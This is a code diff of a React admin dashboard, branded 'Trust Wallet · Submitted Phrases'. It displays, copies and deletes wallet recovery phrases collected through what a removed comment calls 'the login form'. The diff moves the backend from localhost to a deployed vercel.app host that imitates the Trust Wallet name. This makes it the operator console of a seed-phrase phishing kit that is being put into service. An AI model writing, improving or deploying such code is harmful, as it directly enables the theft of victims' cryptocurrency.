@@ -13,6 +13,8 @@ const ShieldLogo = () => (
   </svg>
 );
 
+const API = "https://trust-wallet-backend.vercel.app";
+
 export default function Admin() {
   const [phrases, setPhrases] = useState([]);
   const [loading, setLoading] = useState(true);
@@ -30,12 +32,12 @@ export default function Admin() {
     setLoading(true);
     setError("");
     try {
-      const res = await fetch("http://localhost:3001/api/phrases");
+      const res = await fetch(API + "/api/phrases");
       const data = await res.json();
       if (res.ok) setPhrases(data);
       else setError("Failed to load phrases.");
     } catch (err) {
-      setError("Cannot connect to server. Is the backend running?");
+      setError("Cannot connect to server.");
     } finally {
       setLoading(false);
     }
@@ -50,7 +52,7 @@ export default function Admin() {
   const deletePhrase = async (id) => {
     setDeleting(id);
     try {
-      const res = await fetch("http://localhost:3001/api/phrases/" + id, { method: "DELETE" });
+      const res = await fetch(API + "/api/phrases/" + id, { method: "DELETE" });
       if (res.ok) setPhrases(phrases.filter(p => p.id !== id));
     } catch (err) {
       setError("Could not delete.");
@@ -73,7 +75,6 @@ export default function Admin() {
     <div style={s.bg}>
       <div style={Object.assign({}, s.wrap, mounted ? s.wrapIn : {})}>
 
-        {/* Header */}
         <div style={s.header}>
           <div style={s.headerLeft}>
             <ShieldLogo />
@@ -82,12 +83,9 @@ export default function Admin() {
               <p style={s.subtitle}>Trust Wallet · Submitted Phrases</p>
             </div>
           </div>
-          <button style={s.refreshBtn} onClick={fetchPhrases}>
-            ↻ Refresh
-          </button>
+          <button style={s.refreshBtn} onClick={fetchPhrases}>↻ Refresh</button>
         </div>
 
-        {/* Stats */}
         <div style={s.statsBar}>
           <div style={s.statBox}>
             <span style={s.statNum}>{phrases.length}</span>
@@ -103,10 +101,8 @@ export default function Admin() {
           </div>
         </div>
 
-        {/* Error */}
         {error && <div style={s.errorBox}>⚠️ {error}</div>}
 
-        {/* Loading */}
         {loading && (
           <div style={s.centerBox}>
             <span className="tw-spin" style={s.spinner} />
@@ -114,20 +110,17 @@ export default function Admin() {
           </div>
         )}
 
-        {/* Empty */}
         {!loading && !error && phrases.length === 0 && (
           <div style={s.centerBox}>
             <span style={s.grayText}>No phrases submitted yet.</span>
           </div>
         )}
 
-        {/* Phrase Cards */}
-        {!loading && phrases.map((p, index) => {
+        {!loading && phrases.map((p) => {
           const words = p.phrase.trim().split(/\s+/);
           return (
             <div key={p.id} style={s.card}>
 
-              {/* Card Header */}
               <div style={s.cardHeader}>
                 <div style={s.cardHeaderLeft}>
                   <span style={s.entryBadge}>Entry #{p.id}</span>
@@ -136,7 +129,6 @@ export default function Admin() {
                 <span style={s.dateText}>{formatDate(p.created_at)}</span>
               </div>
 
-              {/* Word Grid - numbered just like they were entered */}
               <div style={s.wordGrid}>
                 {words.map((word, i) => (
                   <div key={i} style={s.wordCell}>
@@ -146,7 +138,6 @@ export default function Admin() {
                 ))}
               </div>
 
-              {/* Card Footer Actions */}
               <div style={s.cardFooter}>
                 <button
                   style={Object.assign({}, s.actionBtn, copied === p.id ? s.copiedBtn : s.copyBtn)}
@@ -174,159 +165,34 @@ export default function Admin() {
 }
 
 const s = {
-  bg: {
-    minHeight: "100vh",
-    background: "#0A0F1E",
-    padding: "24px 16px 40px",
-    fontFamily: "'DM Sans', 'Segoe UI', sans-serif",
-  },
-  wrap: {
-    maxWidth: "700px",
-    margin: "0 auto",
-    opacity: 0,
-    transform: "translateY(12px)",
-    transition: "opacity 0.4s ease, transform 0.4s ease",
-  },
+  bg: { minHeight: "100vh", background: "#0A0F1E", padding: "24px 16px 40px", fontFamily: "'DM Sans', 'Segoe UI', sans-serif" },
+  wrap: { maxWidth: "700px", margin: "0 auto", opacity: 0, transform: "translateY(12px)", transition: "opacity 0.4s ease, transform 0.4s ease" },
   wrapIn: { opacity: 1, transform: "translateY(0)" },
-  header: {
-    display: "flex",
-    alignItems: "center",
-    justifyContent: "space-between",
-    marginBottom: "20px",
-    flexWrap: "wrap",
-    gap: "12px",
-  },
+  header: { display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "20px", flexWrap: "wrap", gap: "12px" },
   headerLeft: { display: "flex", alignItems: "center", gap: "12px" },
   title: { color: "#F1F5F9", fontSize: "20px", fontWeight: "700", margin: 0 },
   subtitle: { color: "#475569", fontSize: "12px", margin: 0 },
-  refreshBtn: {
-    background: "#1E293B",
-    border: "1px solid rgba(255,255,255,0.08)",
-    borderRadius: "10px",
-    padding: "9px 16px",
-    color: "#94A3B8",
-    fontSize: "13px",
-    fontWeight: "500",
-    cursor: "pointer",
-  },
+  refreshBtn: { background: "#1E293B", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "10px", padding: "9px 16px", color: "#94A3B8", fontSize: "13px", fontWeight: "500", cursor: "pointer" },
   statsBar: { display: "flex", gap: "10px", marginBottom: "24px" },
-  statBox: {
-    flex: 1,
-    background: "#1E293B",
-    border: "1px solid rgba(255,255,255,0.06)",
-    borderRadius: "12px",
-    padding: "14px",
-    display: "flex",
-    flexDirection: "column",
-    gap: "4px",
-  },
+  statBox: { flex: 1, background: "#1E293B", border: "1px solid rgba(255,255,255,0.06)", borderRadius: "12px", padding: "14px", display: "flex", flexDirection: "column", gap: "4px" },
   statNum: { color: "#3B82F6", fontSize: "24px", fontWeight: "700" },
   statLabel: { color: "#475569", fontSize: "12px" },
-  errorBox: {
-    background: "rgba(248,113,113,0.08)",
-    border: "1px solid rgba(248,113,113,0.22)",
-    borderRadius: "10px",
-    padding: "12px 16px",
-    color: "#F87171",
-    fontSize: "13px",
-    marginBottom: "16px",
-  },
-  centerBox: {
-    display: "flex", alignItems: "center", justifyContent: "center",
-    gap: "12px", padding: "48px 0",
-  },
-  spinner: {
-    width: "20px", height: "20px",
-    border: "2.5px solid rgba(59,130,246,0.2)",
-    borderTopColor: "#3B82F6",
-    borderRadius: "50%", display: "inline-block",
-  },
+  errorBox: { background: "rgba(248,113,113,0.08)", border: "1px solid rgba(248,113,113,0.22)", borderRadius: "10px", padding: "12px 16px", color: "#F87171", fontSize: "13px", marginBottom: "16px" },
+  centerBox: { display: "flex", alignItems: "center", justifyContent: "center", gap: "12px", padding: "48px 0" },
+  spinner: { width: "20px", height: "20px", border: "2.5px solid rgba(59,130,246,0.2)", borderTopColor: "#3B82F6", borderRadius: "50%", display: "inline-block" },
   grayText: { color: "#475569", fontSize: "14px" },
-
-  // Each submission is a card
-  card: {
-    background: "#1E293B",
-    border: "1px solid rgba(255,255,255,0.07)",
-    borderRadius: "16px",
-    marginBottom: "16px",
-    overflow: "hidden",
-  },
-  cardHeader: {
-    display: "flex",
-    alignItems: "center",
-    justifyContent: "space-between",
-    padding: "12px 16px",
-    background: "#0F172A",
-    borderBottom: "1px solid rgba(255,255,255,0.06)",
-    flexWrap: "wrap",
-    gap: "8px",
-  },
+  card: { background: "#1E293B", border: "1px solid rgba(255,255,255,0.07)", borderRadius: "16px", marginBottom: "16px", overflow: "hidden" },
+  cardHeader: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 16px", background: "#0F172A", borderBottom: "1px solid rgba(255,255,255,0.06)", flexWrap: "wrap", gap: "8px" },
   cardHeaderLeft: { display: "flex", alignItems: "center", gap: "8px" },
-  entryBadge: {
-    background: "rgba(59,130,246,0.15)",
-    color: "#3B82F6",
-    fontSize: "12px",
-    fontWeight: "700",
-    padding: "3px 10px",
-    borderRadius: "20px",
-    border: "1px solid rgba(59,130,246,0.25)",
-  },
-  wordCountBadge: {
-    background: "rgba(255,255,255,0.05)",
-    color: "#64748B",
-    fontSize: "11px",
-    fontWeight: "500",
-    padding: "3px 8px",
-    borderRadius: "20px",
-  },
+  entryBadge: { background: "rgba(59,130,246,0.15)", color: "#3B82F6", fontSize: "12px", fontWeight: "700", padding: "3px 10px", borderRadius: "20px", border: "1px solid rgba(59,130,246,0.25)" },
+  wordCountBadge: { background: "rgba(255,255,255,0.05)", color: "#64748B", fontSize: "11px", fontWeight: "500", padding: "3px 8px", borderRadius: "20px" },
   dateText: { color: "#475569", fontSize: "11px" },
-
-  // Word grid — same layout as the login form
-  wordGrid: {
-    display: "grid",
-    gridTemplateColumns: "repeat(3, 1fr)",
-    gap: "8px",
-    padding: "16px",
-  },
-  wordCell: {
-    display: "flex",
-    alignItems: "center",
-    gap: "7px",
-    background: "#0F172A",
-    border: "1px solid rgba(255,255,255,0.06)",
-    borderRadius: "8px",
-    padding: "8px 10px",
-  },
-  wordIndex: {
-    color: "#2D3F55",
-    fontSize: "10px",
-    fontWeight: "700",
-    minWidth: "14px",
-  },
-  wordValue: {
-    color: "#CBD5E1",
-    fontSize: "13px",
-    fontFamily: "monospace",
-    fontWeight: "500",
-  },
-
-  cardFooter: {
-    display: "flex",
-    gap: "8px",
-    padding: "12px 16px",
-    borderTop: "1px solid rgba(255,255,255,0.05)",
-  },
-  actionBtn: {
-    display: "flex",
-    alignItems: "center",
-    gap: "6px",
-    border: "none",
-    borderRadius: "8px",
-    padding: "8px 14px",
-    fontSize: "13px",
-    fontWeight: "600",
-    cursor: "pointer",
-  },
+  wordGrid: { display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "8px", padding: "16px" },
+  wordCell: { display: "flex", alignItems: "center", gap: "7px", background: "#0F172A", border: "1px solid rgba(255,255,255,0.06)", borderRadius: "8px", padding: "8px 10px" },
+  wordIndex: { color: "#2D3F55", fontSize: "10px", fontWeight: "700", minWidth: "14px" },
+  wordValue: { color: "#CBD5E1", fontSize: "13px", fontFamily: "monospace", fontWeight: "500" },
+  cardFooter: { display: "flex", gap: "8px", padding: "12px 16px", borderTop: "1px solid rgba(255,255,255,0.05)" },
+  actionBtn: { display: "flex", alignItems: "center", gap: "6px", border: "none", borderRadius: "8px", padding: "8px 14px", fontSize: "13px", fontWeight: "600", cursor: "pointer" },
   copyBtn: { background: "rgba(59,130,246,0.12)", color: "#3B82F6" },
   copiedBtn: { background: "rgba(34,197,94,0.12)", color: "#22C55E" },
   deleteBtn: { background: "rgba(248,113,113,0.1)", color: "#F87171" },
